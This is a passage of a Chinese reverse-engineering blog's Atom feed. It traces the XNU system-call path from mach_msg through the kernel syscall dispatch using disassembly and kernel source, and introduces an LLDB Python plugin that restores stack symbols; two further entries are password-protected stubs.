pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
</feed>
